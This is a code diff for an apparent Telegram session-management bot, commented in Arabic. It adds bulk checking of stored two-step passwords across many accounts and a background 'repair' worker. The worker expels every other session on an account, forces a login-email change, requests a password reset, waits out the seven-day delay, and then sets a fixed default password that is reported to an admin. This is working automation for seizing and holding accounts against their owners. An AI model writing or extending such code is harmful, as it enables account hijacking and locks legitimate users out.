@@ -27,6 +27,7 @@ from telethon.tl.functions.account import (
     UpdateNotifySettingsRequest,
     GetAuthorizationsRequest,
     ResetAuthorizationRequest,
+    ResetPasswordRequest,
 )
 from telethon.tl.types import (
     EmailVerifyPurposeLoginSetup,
@@ -76,6 +77,7 @@ logger = logging.getLogger(__name__)
 pending_clients: dict = {}
 _recovery_tasks: dict[str, asyncio.Task] = {}
 _auto_kick_tasks: dict[str, asyncio.Task] = {}
+_repair_two_fa_tasks: dict[str, asyncio.Task] = {}
 _recovery_scheduled: set[str] = set()
 _recovery_fail_count: dict[str, int] = {}
 _recovery_on_done = None
@@ -1527,6 +1529,279 @@ async def bulk_change_two_fa(
         "total": total,
         "fail_details": fail_details,
     }
+
+
+# ──────────────────────────────────────────
+# فحص صحة التحقق بخطوتين وإصلاحه
+# ──────────────────────────────────────────
+async def verify_two_fa_for_session(phone: str) -> dict:
+    """
+    فحص صحة التحقق بخطوتين المخزن في DB:
+    يحاول تغيير كلمة المرور لنفسها — إذا رفض تيليجرام فهي خاطئة.
+    يُرجع: {'valid': True/False, 'error': '...', 'skip': True إن كانت الجلسة غير متصلة}
+    """
+    row = await database.get_session_by_phone(phone)
+    if not row:
+        return {"valid": False, "error": "no_session", "skip": True}
+    stored_2fa = database.row_get(row, "two_fa")
+    if not stored_2fa:
+        return {"valid": False, "error": "no_two_fa_stored", "skip": True}
+
+    client = await get_active_client(phone)
+    if not client:
+        return {"valid": False, "error": "session_inactive", "skip": True}
+
+    try:
+        await client.edit_2fa(
+            current_password=stored_2fa,
+            new_password=stored_2fa,
+            hint="",
+            email=None,
+        )
+        return {"valid": True}
+    except PasswordHashInvalidError:
+        return {"valid": False, "error": "wrong_password"}
+    except Exception as e:
+        err = str(e)
+        # NEW_SETTINGS_EMPTY = نفس كلمة المرور مقبولة لكن تيليجرام لا يغيرها → صالحة
+        if "NEW_SETTINGS_EMPTY" in err.upper() or "same" in err.lower():
+            return {"valid": True}
+        logger.debug("verify_two_fa %s: %s", phone, err)
+        return {"valid": False, "error": err, "skip": True}
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+
+async def bulk_verify_two_fa(
+    progress_cb=None,
+    should_stop=None,
+) -> dict:
+    """
+    فحص صحة التحقق بخطوتين لجميع الجلسات الصالحة الشغالة.
+    الجلسات ذات التحقق الخاطئ تُعلَّم invalid_two_fa=1 في DB.
+    progress_cb(done, total, valid_n, invalid_n, skip_n)
+    """
+    sessions = await database.get_all_sessions()
+    # نحسب فقط الجلسات الصالحة التي لها two_fa
+    eligible = [s for s in sessions if s["valid"] and s["two_fa"]]
+    total = len(eligible)
+    done = 0
+    valid_count = 0
+    invalid_count = 0
+    skip_count = 0
+    invalid_phones: list[str] = []
+
+    for s in eligible:
+        phone = s["phone"]
+
+        if should_stop and should_stop():
+            remaining = total - done
+            skip_count += remaining
+            break
+
+        alive = await check_session_alive(phone)
+        if not alive:
+            skip_count += 1
+            done += 1
+            if progress_cb:
+                await progress_cb(done, total, valid_count, invalid_count, skip_count)
+            continue
+
+        done += 1
+        result = await verify_two_fa_for_session(phone)
+
+        if result.get("skip"):
+            skip_count += 1
+        elif result.get("valid"):
+            valid_count += 1
+            await database.clear_session_invalid_two_fa(phone)
+            logger.info("bulk_verify_2fa: valid 2FA for %s", phone)
+        else:
+            invalid_count += 1
+            await database.mark_session_invalid_two_fa(phone)
+            invalid_phones.append(phone)
+            logger.warning(
+                "bulk_verify_2fa: INVALID 2FA for %s: %s", phone, result.get("error")
+            )
+
+        if progress_cb:
+            await progress_cb(done, total, valid_count, invalid_count, skip_count)
+
+        await asyncio.sleep(1)
+
+    return {
+        "total": total,
+        "valid": valid_count,
+        "invalid": invalid_count,
+        "skip": skip_count,
+        "invalid_phones": invalid_phones,
+    }
+
+
+def schedule_repair_two_fa(phone: str):
+    """جدولة إصلاح التحقق بخطوتين كـ background task."""
+    if phone in _repair_two_fa_tasks and not _repair_two_fa_tasks[phone].done():
+        return
+    _repair_two_fa_tasks[phone] = asyncio.create_task(_repair_two_fa_worker(phone))
+
+
+async def resume_repair_two_fa_pipelines():
+    """استئناف عمليات إصلاح التحقق بعد إعادة تشغيل البوت."""
+    import time
+    sessions = await database.get_sessions_pending_repair_two_fa()
+    for s in sessions:
+        phone = s["phone"]
+        stage = s["repair_2fa_stage"]
+        until_ts = s["repair_2fa_until"] or 0
+        if stage == 1 and until_ts > time.time():
+            # لا تزال تنتظر 7 أيام
+            schedule_repair_two_fa(phone)
+        elif stage in (1, 2):
+            # انتهت المدة أو مرحلة الاستطلاع
+            schedule_repair_two_fa(phone)
+        elif stage == 0:
+            schedule_repair_two_fa(phone)
+    if sessions:
+        logger.info("resumed repair-2FA for %d sessions", len(sessions))
+
+
+async def _repair_two_fa_worker(phone: str):
+    """
+    إصلاح حساب تحققه غير صالح (خلفياً):
+    0) طرد كل الجلسات + تغيير البريد إجباري
+    1) طلب إعادة تعيين كلمة المرور (7 أيام)
+    2) انتظار 7 أيام → فحص كل 5 دقائق حتى 5 ساعات
+    3) تعيين DEFAULT_2FA_PASSWORD وتحديث DB
+    """
+    import time
+
+    try:
+        row = await database.get_session_by_phone(phone)
+        if not row:
+            return
+
+        # ── المرحلة 0: طرد + بريد ──
+        stage = row["repair_2fa_stage"]
+        if stage is None or stage < 1:
+            await database.update_repair_2fa_stage(phone, 0)
+
+            # أ) طرد الجلسات الأخرى
+            kick_res = await admin_kick_only(phone)
+            await _notify_admin(phone, "repair_2fa_kicked", ok=kick_res.get("success"),
+                                error=kick_res.get("error", ""))
+
+            # ب) تغيير البريد إجباري
+            email_res = await change_login_email(phone, force=True)
+            await _notify_admin(phone, "repair_2fa_email",
+                                ok=email_res.get("success"),
+                                email=email_res.get("email", ""))
+
+            # ج) طلب إعادة تعيين كلمة المرور
+            client = await get_active_client(phone)
+            if not client:
+                await _notify_admin(phone, "repair_2fa_fail",
+                                    step="reset_request", error="الجلسة غير متاحة")
+                return
+
+            until_ts = 0
+            try:
+                result = await client(ResetPasswordRequest())
+                result_class = type(result).__name__
+                logger.info("repair_2fa %s: ResetPassword -> %s", phone, result_class)
+
+                if result_class == "ResetPasswordOk":
+                    until_ts = 0
+                elif result_class == "ResetPasswordRequestedWait":
+                    raw_until = result.until_date
+                    until_ts = int(raw_until.timestamp() if hasattr(raw_until, "timestamp") else raw_until)
+                elif result_class == "ResetPasswordFailedWait":
+                    raw_retry = result.retry_date
+                    retry_ts = int(raw_retry.timestamp() if hasattr(raw_retry, "timestamp") else raw_retry)
+                    wait = max(0, retry_ts - time.time())
+                    await asyncio.sleep(wait + 5)
+                    result2 = await client(ResetPasswordRequest())
+                    r2class = type(result2).__name__
+                    if r2class == "ResetPasswordRequestedWait":
+                        raw_until = result2.until_date
+                        until_ts = int(raw_until.timestamp() if hasattr(raw_until, "timestamp") else raw_until)
+            except Exception as e:
+                logger.warning("repair_2fa reset_request %s: %s", phone, e)
+                await _notify_admin(phone, "repair_2fa_fail",
+                                    step="reset_request", error=str(e))
+                return
+            finally:
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
+
+            await database.update_repair_2fa_stage(phone, 1, until_ts=int(until_ts) if until_ts else None)
+
+            if until_ts > 0:
+                wait_days = max(0, until_ts - time.time()) / 86400
+                await _notify_admin(phone, "repair_2fa_reset_requested",
+                                    wait_days=round(wait_days, 1), until_ts=until_ts)
+                wait_secs = max(0, until_ts - time.time())
+                await asyncio.sleep(wait_secs)
+            else:
+                await _notify_admin(phone, "repair_2fa_reset_requested", wait_days=0, until_ts=0)
+
+        # ── المرحلة 2: فحص كل 5 دقائق حتى 5 ساعات ──
+        await database.update_repair_2fa_stage(phone, 2)
+        poll_deadline = time.time() + 5 * 3600
+        poll_interval = 300  # 5 دقائق
+
+        success = False
+        while time.time() < poll_deadline:
+            client = await get_active_client(phone)
+            if not client:
+                await asyncio.sleep(poll_interval)
+                continue
+            try:
+                result = await client(ResetPasswordRequest())
+                result_class = type(result).__name__
+                logger.info("repair_2fa poll %s: %s", phone, result_class)
+                if result_class == "ResetPasswordOk":
+                    success = True
+                    await client.disconnect()
+                    break
+            except Exception as e:
+                logger.debug("repair_2fa poll %s: %s", phone, e)
+            finally:
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
+            await asyncio.sleep(poll_interval)
+
+        if not success:
+            await _notify_admin(phone, "repair_2fa_fail",
+                                step="poll_timeout",
+                                error="انتهت مدة الانتظار (5 ساعات) — لا يمكن إصلاح هذا الحساب تلقائياً")
+            return
+
+        # ── المرحلة 3: تعيين DEFAULT_2FA_PASSWORD ──
+        two_fa_res = await set_two_fa(phone, DEFAULT_2FA_PASSWORD, old_password=None)
+        if two_fa_res.get("success"):
+            await database.clear_session_invalid_two_fa(phone)
+            await database.update_repair_2fa_stage(phone, 3)
+            await _notify_admin(phone, "repair_2fa_success", password=DEFAULT_2FA_PASSWORD)
+            logger.info("repair_2fa %s: SUCCESS", phone)
+        else:
+            await _notify_admin(phone, "repair_2fa_fail",
+                                step="set_2fa", error=two_fa_res.get("error", ""))
+            logger.warning("repair_2fa %s: failed set_2fa: %s", phone, two_fa_res.get("error"))
+
+    except asyncio.CancelledError:
+        logger.info("repair_2fa_worker %s: cancelled", phone)
+    except Exception as e:
+        logger.error("repair_2fa_worker %s: %s", phone, e)
+        await _notify_admin(phone, "repair_2fa_fail", step="exception", error=str(e))
+    finally:
+        _repair_two_fa_tasks.pop(phone, None)
 
 
 async def set_direct_2fa(phone: str, new_password: str) -> dict:
